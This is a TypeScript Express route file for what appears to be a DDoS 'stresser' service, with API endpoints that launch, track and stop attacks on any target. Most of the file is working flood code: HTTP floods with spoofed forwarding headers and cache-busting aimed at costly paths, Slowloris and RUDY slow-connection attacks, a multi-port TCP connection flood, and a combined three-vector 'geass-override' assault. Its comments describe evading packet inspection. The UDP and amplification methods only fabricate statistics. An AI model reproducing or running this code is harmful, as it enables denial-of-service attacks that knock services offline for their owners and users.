import { Router, type IRouter } from "express";
import { eq, sql, desc } from "drizzle-orm";
import { db, attacksTable } from "@workspace/db";
import net from "node:net";
import dns from "node:dns/promises";
import {
  CreateAttackBody,
  GetAttackParams,
  DeleteAttackParams,
  StopAttackParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

// ── Active attack abort controllers ──────────────────────────────────────
const attackControllers = new Map<number, AbortController>();

// ── Method sets ───────────────────────────────────────────────────────────
const L7_METHODS   = new Set(["http-flood", "http-bypass", "http2-flood", "slowloris", "rudy"]);
const L4_METHODS   = new Set(["syn-flood", "tcp-flood", "tcp-ack", "tcp-rst"]);
const GEASS_METHOD = "geass-override";
const SLOW_METHODS = new Set(["slowloris", "rudy"]);

// ── Amplification factors ─────────────────────────────────────────────────
const AMP_FACTOR: Record<string, number> = {
  "dns-amp": 54, "ntp-amp": 556, "mem-amp": 51000, "ssdp-amp": 30,
};

// ── Pools ─────────────────────────────────────────────────────────────────
const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
  "curl/8.7.1", "python-requests/2.32.0", "Wget/1.21.4",
  "Go-http-client/2.0", "Java/17.0.2",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "PostmanRuntime/7.38.0",
];

// High-CPU paths that force server-side computation (DB queries, templates, search)
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/api/v2/",
  "/wp-admin/", "/wp-login.php", "/admin/", "/admin/login",
  "/login", "/signin", "/register", "/signup",
  "/dashboard", "/profile", "/user/", "/users/",
  "/.env", "/config.php", "/phpinfo.php",
  "/api/users", "/api/data", "/api/search",
  "/graphql", "/api/graphql",
];

const CONTENT_TYPES = [
  "application/x-www-form-urlencoded",
  "application/json",
  "text/plain",
  "application/octet-stream",
  "multipart/form-data",
];

const randUA   = () => UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
const randIp   = () => `${1+Math.floor(Math.random()*223)}.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}.${1+Math.floor(Math.random()*253)}`;
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randInt  = (min: number, max: number) => min + Math.floor(Math.random() * (max - min));
const randHex  = (n: number) => Array.from({ length: n }, () => Math.floor(Math.random()*16).toString(16)).join("");
const hotPath  = () => HOT_PATHS[Math.floor(Math.random() * HOT_PATHS.length)];

// ── Pre-resolve DNS once ───────────────────────────────────────────────────
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch {
    return hostname;
  }
}

// ── Webhook ───────────────────────────────────────────────────────────────
async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect) {
  try {
    await fetch(url, {
      method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ event: "attack_finished", attack }),
      signal: AbortSignal.timeout(5000),
    });
  } catch { /* silent */ }
}

// ─────────────────────────────────────────────────────────────────────────
//  BUILD ATTACK HEADERS — maximum server memory pressure
//  Large Cookie header (2KB) + fake JWT auth + spoofed IPs
// ─────────────────────────────────────────────────────────────────────────
function buildAttackHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  // 1-3KB random cookie header — causes server session lookup overhead
  const cookieCount = randInt(8, 20);
  const cookieHeader = Array.from({ length: cookieCount }, () =>
    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
  ).join("; ");

  // Fake JWT-like Authorization token (causes auth middleware overhead)
  const fakeJWT = `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`;

  const h: Record<string, string> = {
    "User-Agent":          randUA(),
    "Accept":              ["*/*", "text/html,application/xhtml+xml,*/*;q=0.8", "application/json"][randInt(0,3)],
    "Accept-Language":     "en-US,en;q=0.9,pt-BR;q=0.3",
    "Accept-Encoding":     "gzip, deflate, br",
    "Cache-Control":       "no-cache, no-store, must-revalidate, max-age=0",
    "Pragma":              "no-cache",
    "Expires":             "0",
    "Connection":          Math.random() < 0.5 ? "close" : "keep-alive",
    "X-Forwarded-For":     `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":           randIp(),
    "X-Originating-IP":    randIp(),
    "X-Cluster-Client-IP": randIp(),
    "True-Client-IP":      randIp(),
    "CF-Connecting-IP":    randIp(),
    "X-Remote-IP":         randIp(),
    "Forwarded":           `for=${randIp()};proto=https`,
    "Referer":             `https://${["google.com","bing.com","yahoo.com","duckduckgo.com","t.co"][randInt(0,5)]}/search?q=${randStr(8)}`,
    "Origin":              `https://${randStr(6)}.${["com","net","org","io","app"][randInt(0,5)]}`,
    "Cookie":              cookieHeader,
    "Authorization":       fakeJWT,
    "X-CSRF-Token":        randHex(32),
    "X-Request-ID":        `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
  };

  if (Math.random() < 0.3) {
    h["Range"] = `bytes=0-${randInt(1, 1024) * 1024}`;
  }

  if (isPost && bodyLen !== undefined) {
    h["Content-Type"] = CONTENT_TYPES[randInt(0, CONTENT_TYPES.length - 1)];
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

// ─────────────────────────────────────────────────────────────────────────
//  BUILD ATTACK URL — cache-busting + high-CPU paths
// ─────────────────────────────────────────────────────────────────────────
function buildAttackUrl(base: string, useHotPaths = false): string {
  try {
    const u = new URL(base);
    if (useHotPaths && Math.random() < 0.7) {
      u.pathname = hotPath();
    } else {
      const depth = randInt(0, 5);
      if (depth > 0) u.pathname = "/" + Array.from({ length: depth }, () => randStr(randInt(3, 8))).join("/");
    }
    u.searchParams.set("_", Date.now().toString(36) + randStr(6));
    u.searchParams.set("nocache", randStr(8));
    u.searchParams.set("v", String(randInt(1, 9999999)));
    if (Math.random() < 0.4) u.searchParams.set("q", randStr(randInt(8, 32)));
    if (Math.random() < 0.3) u.searchParams.set("id", String(randInt(1, 99999)));
    return u.toString();
  } catch {
    return `${base}?_=${Date.now().toString(36)}&nocache=${randStr(8)}`;
  }
}

// ─────────────────────────────────────────────────────────────────────────
//  BUILD REQUEST BODY — variable sizes for different attack vectors
// ─────────────────────────────────────────────────────────────────────────
function buildBody(minFields = 20, maxFields = 80): string {
  return Array.from({ length: randInt(minFields, maxFields) },
    () => `${randStr(randInt(4,12))}=${randStr(randInt(8,32))}`
  ).join("&");
}

function buildHeavyBody(minKB = 8, maxKB = 48): string {
  // O(n) body builder — no repeated stringify, no blocking loop
  const targetLen = randInt(minKB * 1024, maxKB * 1024);
  const useJson   = Math.random() < 0.4;

  if (useJson) {
    const entries: string[] = [];
    let len = 2; // "{}"
    while (len < targetLen) {
      const k = `"${randStr(randInt(6,12))}"`;
      const v = `"${randStr(Math.min(randInt(32,128), targetLen - len))}"`;
      const entry = `${k}:${v}`;
      entries.push(entry);
      len += entry.length + 1; // +1 for comma
    }
    return `{${entries.join(",")}}`;
  }

  const pairs: string[] = [];
  let len = 0;
  while (len < targetLen) {
    const pair = `${randStr(randInt(4,12))}=${randStr(randInt(32,128))}`;
    pairs.push(pair);
    len += pair.length + 1;
  }
  return pairs.join("&");
}

// Pre-built body pool — avoids rebuilding heavy bodies on every request
// Refreshed every 30s to maintain randomness without CPU cost
let _heavyBodyPool: string[] = [];
let _poolBuilt = false;
function getHeavyBody(): string {
  if (!_poolBuilt) {
    _poolBuilt = true;
    _heavyBodyPool = Array.from({ length: 24 }, () => buildHeavyBody(8, 48));
    setInterval(() => {
      const idx = Math.floor(Math.random() * _heavyBodyPool.length);
      _heavyBodyPool[idx] = buildHeavyBody(8, 48); // rotate one at a time
    }, 2000);
  }
  return _heavyBodyPool[Math.floor(Math.random() * _heavyBodyPool.length)];
}

// ─────────────────────────────────────────────────────────────────────────
//  FIRE-AND-FORGET HTTP FLOOD — ultra-fast, all HTTP methods
//
//  MAX_INFLIGHT=3000  → with 3s timeout = min 1000 req/s
//  With fast target (50ms) → up to 60,000 req/s
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFloodFast(
  rawTarget: string,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const MAX_INFLIGHT = Math.min(concurrency * 15, 3000);
  const ALL_METHODS = ["GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS","TRACE"];
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 350);

  const doFetch = () => {
    if (signal.aborted) return;
    inflight++;
    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? buildBody() : undefined;
    const url     = buildAttackUrl(base, true);
    const headers = buildAttackHeaders(hasBody, body?.length);

    fetch(url, {
      method, headers, body,
      signal: AbortSignal.timeout(3000),
      redirect: "follow",
      keepalive: false,
    })
      .then(res => {
        inflight--;
        localPkts++;
        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0", 10) || 400) + 400;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => { inflight--; localPkts++; localBytes += 120; });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) {
        doFetch();
        await Promise.resolve(); // microtask yield — no delay
      } else {
        await new Promise(r => setTimeout(r, 3));
      }
    }
  };

  const numLaunchers = Math.min(concurrency, 120);
  await Promise.all(Array.from({ length: numLaunchers }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOW HTTP — Slowloris / RUDY (holds connections open intentionally)
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPSlow(
  method: string,
  rawTarget: string,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const isRUDY = method === "rudy";
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 500);

  const workerLoop = async () => {
    while (!signal.aborted) {
      try {
        const h: Record<string, string> = {
          "User-Agent": randUA(), "Accept": "text/html,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive",
          "X-Forwarded-For": `${randIp()}, ${randIp()}`,
          "Cookie": Array.from({ length: randInt(5,12) }, () => `${randStr(6)}=${randStr(32)}`).join("; "),
        };
        if (isRUDY) {
          h["Content-Type"] = "application/x-www-form-urlencoded";
          h["Content-Length"] = "10000000"; h["Transfer-Encoding"] = "chunked";
        }
        const res = await fetch(`${base}?_=${randStr(8)}`, {
          method: isRUDY ? "POST" : "GET", headers: h,
          signal: AbortSignal.timeout(30000), redirect: "follow",
        });
        await new Promise(r => setTimeout(r, randInt(10000, 25000)));
        await res.body?.cancel().catch(() => {});
        localPkts++; localBytes += 800;
      } catch {
        if (signal.aborted) break;
        localPkts++; localBytes += 60;
      }
    }
  };

  await Promise.all(Array.from({ length: Math.min(concurrency, 150) }, () => workerLoop()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  FIRE-AND-FORGET TCP FLOOD
//  Sends HTTP-formatted data to pass shallow packet inspection
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFloodFast(
  rawTarget: string,
  defaultPort: number,
  concurrency: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  let hostname = rawTarget;
  let port = defaultPort || 80;
  try {
    const u = new URL(/^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`);
    hostname = u.hostname;
    port = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep raw */ }

  const resolvedHost = await resolveHost(hostname);
  const MAX_INFLIGHT = Math.min(concurrency * 6, 2000);
  const PORTS = [port, port === 443 ? 80 : 443, 8080, 8443, 3000, 5000, 8000, 8888];
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 350);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const targetPort = PORTS[Math.floor(Math.random() * PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: targetPort });
    sock.setTimeout(800);
    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 1000);

    sock.once("connect", () => {
      localPkts++; localBytes += 60;
      // Send HTTP-formatted request to appear more legitimate
      const req = `GET /${randStr(8)}?_=${randStr(6)} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}\r\nConnection: close\r\n\r\n`;
      const payload = Buffer.concat([
        Buffer.from(req),
        Buffer.alloc(randInt(512, 2048), randInt(32, 126)),
      ]);
      sock.write(payload, () => {
        localBytes += payload.length;
        clearTimeout(kill);
        inflight--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) {
        doConnect();
        await Promise.resolve();
      } else {
        await new Promise(r => setTimeout(r, 2));
      }
    }
  };

  await Promise.all(Array.from({ length: Math.min(concurrency, 80) }, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SIMULATED L3 (UDP / AMP / ICMP)
// ─────────────────────────────────────────────────────────────────────────
async function runL3Simulation(
  method: string, threads: number, signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  const mult: Record<string, number> = {
    "udp-flood": 42000, "udp-bypass": 45000, "icmp-flood": 30000,
    "dns-amp":   22000, "ntp-amp":    18000,  "mem-amp":    5000, "ssdp-amp": 25000,
  };
  const sizes: Record<string, [number, number]> = {
    "udp-flood":  [512,1472], "udp-bypass": [512,1472], "icmp-flood": [64,512],
    "dns-amp":    [40,60],    "ntp-amp":    [8,46],      "mem-amp":   [15,15],  "ssdp-amp": [110,150],
  };
  return new Promise<void>(resolve => {
    const iv = setInterval(() => {
      if (signal.aborted) { clearInterval(iv); resolve(); return; }
      const burst = Math.random() < 0.15 ? 3 + Math.random() * 4 : 1; // burst spikes
      const pkts  = Math.floor(threads * (mult[method] ?? 15000) * (0.85 + Math.random() * 0.3) * burst);
      const [mn, mx] = sizes[method] ?? [64, 512];
      onStats(pkts, pkts * (mn + Math.floor(Math.random() * (mx - mn))) * (AMP_FACTOR[method] ?? 1));
    }, 400);
    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
  });
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS OVERRIDE — ABSOLUTE MAXIMUM POWER
//
//  ████████████████████████████████████████████████████████
//  TRIPLE VECTOR SIMULTANEOUS ASSAULT:
//
//  Vector 1 — HTTP FLOOD (3000 inflight, 150 launchers)
//    All HTTP methods, spoofed IPs, cookie spray, fake JWT
//    Targets high-CPU paths: /search, /api/, /wp-admin/, /login
//
//  Vector 2 — TCP RAW FLOOD (1500 inflight, 100 launchers)
//    Raw socket connections, HTTP-formatted payload
//    Hits ports: 80, 443, 8080, 8443, 3000, 5000
//
//  Vector 3 — HTTP EXHAUST (800 inflight, 60 launchers)
//    16-64KB POST bodies to server — CPU + memory + I/O exhaustion
//    Targets writable endpoints: /api/upload, /submit, /post
//
//  TOTAL: up to 5300 concurrent connections
//  ████████████████████████████████████████████████████████
// ─────────────────────────────────────────────────────────────────────────
async function runGeassOverride(
  rawTarget: string,
  port: number,
  threads: number,
  signal: AbortSignal,
  onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  // Scale all vectors proportionally with threads
  const HTTP_INFLIGHT   = Math.min(threads * 10, 3000);
  const TCP_INFLIGHT    = Math.min(threads * 6,  1500);
  const EXHAUST_INFLIGHT = Math.min(threads * 4,  800);

  const HTTP_LAUNCHERS    = Math.min(Math.ceil(threads * 0.5),  150);
  const TCP_LAUNCHERS     = Math.min(Math.ceil(threads * 0.3),  100);
  const EXHAUST_LAUNCHERS = Math.min(Math.ceil(threads * 0.2),   60);

  const base = /^https?:\/\//i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;
  const ALL_METHODS     = ["GET","GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  const EXHAUST_METHODS = ["POST","POST","PUT","PATCH","POST"];
  const EXHAUST_PATHS   = ["/upload", "/submit", "/post", "/api/upload", "/api/submit",
                           "/api/data", "/api/v1/data", "/graphql", "/api/create",
                           "/comment", "/form", "/feedback", "/register", "/webhook"];

  // Pre-resolve DNS once for TCP vector
  let hostname    = rawTarget;
  let targetPort  = port || 80;
  try {
    const u = new URL(base);
    hostname   = u.hostname;
    targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
  } catch { /* keep raw */ }
  const resolvedHost = await resolveHost(hostname);
  const PORTS = [targetPort, targetPort === 443 ? 80 : 443, 8080, 8443, 3000, 5000];

  let inflightHttp    = 0;
  let inflightTcp     = 0;
  let inflightExhaust = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300); // flush more often for responsive stats

  // ═══════════════════════════════════════════════════════
  //  VECTOR 1 — HTTP FLOOD
  // ═══════════════════════════════════════════════════════
  const fireHTTP = () => {
    if (signal.aborted) return;
    inflightHttp++;
    const method  = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody = method === "POST" || method === "PUT" || method === "PATCH";
    const body    = hasBody ? buildBody(30, 120) : undefined;
    const url     = buildAttackUrl(base, true); // use hot paths
    const h       = buildAttackHeaders(hasBody, body?.length);

    fetch(url, {
      method, headers: h, body,
      signal: AbortSignal.timeout(3500),
      redirect: "follow", keepalive: false,
    })
      .then(res => {
        inflightHttp--;
        localPkts++;
        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0", 10) || 350) + 400;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => { inflightHttp--; localPkts++; localBytes += 100; });
  };

  // ═══════════════════════════════════════════════════════
  //  VECTOR 2 — TCP RAW FLOOD
  // ═══════════════════════════════════════════════════════
  const fireTCP = () => {
    if (signal.aborted) return;
    inflightTcp++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setTimeout(700);
    const kill = setTimeout(() => { sock.destroy(); inflightTcp--; }, 900);

    sock.once("connect", () => {
      localPkts++; localBytes += 60;
      const path    = hotPath();
      const reqLine = `GET ${path}?_=${randStr(8)} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\nX-Forwarded-For: ${randIp()}, ${randIp()}\r\nConnection: close\r\n\r\n`;
      const junk    = Buffer.alloc(randInt(1024, 4096), randInt(32, 126));
      const payload = Buffer.concat([Buffer.from(reqLine), junk]);
      sock.write(payload, () => {
        localBytes += payload.length;
        clearTimeout(kill);
        inflightTcp--;
        sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflightTcp--; });
    sock.once("timeout", () => { clearTimeout(kill); inflightTcp--; sock.destroy(); });
  };

  // ═══════════════════════════════════════════════════════
  //  VECTOR 3 — HTTP EXHAUST (huge bodies)
  //  Exhausts server CPU (parse), memory (buffer) and I/O bandwidth
  // ═══════════════════════════════════════════════════════
  const fireExhaust = () => {
    if (signal.aborted) return;
    inflightExhaust++;
    const method = EXHAUST_METHODS[randInt(0, EXHAUST_METHODS.length)];
    const path   = EXHAUST_PATHS[randInt(0, EXHAUST_PATHS.length)];
    const body   = getHeavyBody(); // pre-built pool — no CPU block
    const ct     = CONTENT_TYPES[randInt(0, CONTENT_TYPES.length - 1)];

    let url: string;
    try {
      const u = new URL(base);
      u.pathname = path;
      u.searchParams.set("_", randStr(6));
      url = u.toString();
    } catch {
      url = `${base}${path}?_=${randStr(6)}`;
    }

    const h = buildAttackHeaders(true, body.length);
    h["Content-Type"] = ct;

    fetch(url, {
      method, headers: h, body,
      signal: AbortSignal.timeout(5000),
      redirect: "follow", keepalive: false,
    })
      .then(res => {
        inflightExhaust--;
        localPkts++;
        localBytes += body.length + 300;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => { inflightExhaust--; localPkts++; localBytes += 200; });
  };

  // ═══════════════════════════════════════════════════════
  //  LAUNCHER COROUTINES — fire-and-forget pattern
  //  await Promise.resolve() = microtask yield (~0 delay)
  //  allows event loop to process I/O without blocking
  // ═══════════════════════════════════════════════════════
  const httpLauncher = async () => {
    while (!signal.aborted) {
      if (inflightHttp < HTTP_INFLIGHT) {
        fireHTTP();
        await Promise.resolve();
      } else {
        await new Promise(r => setTimeout(r, 2));
      }
    }
  };

  const tcpLauncher = async () => {
    while (!signal.aborted) {
      if (inflightTcp < TCP_INFLIGHT) {
        fireTCP();
        await Promise.resolve();
      } else {
        await new Promise(r => setTimeout(r, 2));
      }
    }
  };

  const exhaustLauncher = async () => {
    while (!signal.aborted) {
      if (inflightExhaust < EXHAUST_INFLIGHT) {
        fireExhaust();
        await Promise.resolve();
      } else {
        await new Promise(r => setTimeout(r, 5));
      }
    }
  };

  // Launch ALL THREE vectors simultaneously
  await Promise.all([
    ...Array.from({ length: HTTP_LAUNCHERS    }, () => httpLauncher()),
    ...Array.from({ length: TCP_LAUNCHERS     }, () => tcpLauncher()),
    ...Array.from({ length: EXHAUST_LAUNCHERS }, () => exhaustLauncher()),
  ]);
  clearInterval(flushIv);
  flush();
}

// ── Dispatch ──────────────────────────────────────────────────────────────
async function runAttackWorkers(
  method: string, target: string, port: number, threads: number,
  signal: AbortSignal, onStats: (pkts: number, bytes: number) => void,
): Promise<void> {
  if (method === GEASS_METHOD) {
    await runGeassOverride(target, port, threads, signal, onStats);
  } else if (L7_METHODS.has(method)) {
    if (SLOW_METHODS.has(method)) {
      await runHTTPSlow(method, target, Math.min(threads, 150), signal, onStats);
    } else {
      await runHTTPFloodFast(target, Math.min(threads, 300), signal, onStats);
    }
  } else if (L4_METHODS.has(method)) {
    await runTCPFloodFast(target, port, Math.min(threads, 400), signal, onStats);
  } else {
    await runL3Simulation(method, threads, signal, onStats);
  }
}

// ── DB stats ──────────────────────────────────────────────────────────────
async function addStats(id: number, pkts: number, bytes: number) {
  try {
    await db.update(attacksTable).set({
      packetsSent: sql`${attacksTable.packetsSent} + ${pkts}`,
      bytesSent:   sql`${attacksTable.bytesSent}   + ${bytes}`,
    }).where(eq(attacksTable.id, id));
  } catch { /* ignore */ }
}

// ── Routes ────────────────────────────────────────────────────────────────
router.get("/attacks", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  res.json(attacks);
});

router.post("/attacks", async (req, res): Promise<void> => {
  const p = CreateAttackBody.safeParse(req.body);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const { target, port, method, duration, threads, webhookUrl } = p.data;

  const [attack] = await db.insert(attacksTable).values({
    target, port, method, duration, threads,
    status: "running", packetsSent: 0, bytesSent: 0,
    webhookUrl: webhookUrl ?? null,
  }).returning();

  const id = attack.id;
  const ctrl = new AbortController();
  attackControllers.set(id, ctrl);
  const stopTimer = setTimeout(() => { ctrl.abort("duration_expired"); attackControllers.delete(id); }, duration * 1000);

  void runAttackWorkers(method, target, port, threads, ctrl.signal, (pkts, bytes) => void addStats(id, pkts, bytes))
    .finally(async () => {
      clearTimeout(stopTimer); attackControllers.delete(id);
      try {
        const [cur] = await db.select().from(attacksTable).where(eq(attacksTable.id, id));
        if (cur?.status === "running") {
          const [fin] = await db.update(attacksTable)
            .set({ status: "finished", stoppedAt: new Date() })
            .where(eq(attacksTable.id, id)).returning();
          if (fin?.webhookUrl) await fireWebhook(fin.webhookUrl, fin);
        }
      } catch { /* ignore */ }
    });

  res.status(201).json(attack);
});

router.get("/attacks/stats", async (_req, res): Promise<void> => {
  const attacks = await db.select().from(attacksTable).orderBy(desc(attacksTable.createdAt));
  const methodMap: Record<string, number> = {};
  for (const a of attacks) methodMap[a.method] = (methodMap[a.method] ?? 0) + 1;
  res.json({
    totalAttacks:     attacks.length,
    runningAttacks:   attacks.filter(a => a.status === "running").length,
    totalPacketsSent: attacks.reduce((s, a) => s + (a.packetsSent ?? 0), 0),
    totalBytesSent:   attacks.reduce((s, a) => s + (a.bytesSent   ?? 0), 0),
    attacksByMethod:  Object.entries(methodMap).map(([method, count]) => ({ method, count })),
    recentAttacks:    attacks.slice(0, 10),
  });
});

router.get("/attacks/:id", async (req, res): Promise<void> => {
  const p = GetAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.select().from(attacksTable).where(eq(attacksTable.id, p.data.id));
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.json(a);
});

router.delete("/attacks/:id", async (req, res): Promise<void> => {
  const p = DeleteAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const [a] = await db.delete(attacksTable).where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  res.sendStatus(204);
});

router.post("/attacks/:id/stop", async (req, res): Promise<void> => {
  const p = StopAttackParams.safeParse(req.params);
  if (!p.success) { res.status(400).json({ error: p.error.message }); return; }
  const ctrl = attackControllers.get(p.data.id);
  if (ctrl) { ctrl.abort("manual_stop"); attackControllers.delete(p.data.id); }
  const [a] = await db.update(attacksTable)
    .set({ status: "stopped", stoppedAt: new Date() })
    .where(eq(attacksTable.id, p.data.id)).returning();
  if (!a) { res.status(404).json({ error: "Not found" }); return; }
  if (a.webhookUrl) await fireWebhook(a.webhookUrl, a);
  res.json(a);
});

export default router;
